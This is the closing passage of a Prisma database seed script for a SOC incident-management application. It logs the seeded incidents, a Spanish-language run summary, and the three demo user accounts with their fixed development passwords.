    console.log(`[${createdIncident.priority.padEnd(8)}] [${createdIncident.status.padEnd(11)}] ${createdIncident.title}`);
  }

  console.log('\n===========================================================');
  console.log('🎉 RESUMEN DE EJECUCIÓN DEL SEED SOC:');
  console.log(`✔ Total de Incidentes insertados: ${createdIncidentsCount}`);
  console.log(`✔ Total de Registros de Auditoría creados: ${createdAuditLogsCount}`);
  console.log('✔ Usuarios activos disponibles:');
  console.log(`   - ADMIN: ${admin.email} (Password: AdminPass2026!)`);
  console.log(`   - TECH:  ${techUser.email} (Password: SocAnalyst2026!)`);
  console.log(`   - USER:  ${corporateUser.email} (Password: UserPass2026!)`);
  console.log('===========================================================');
}

main()
  .catch((e) => {
    console.error('❌ Error durante la ejecución del seed SOC:', e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
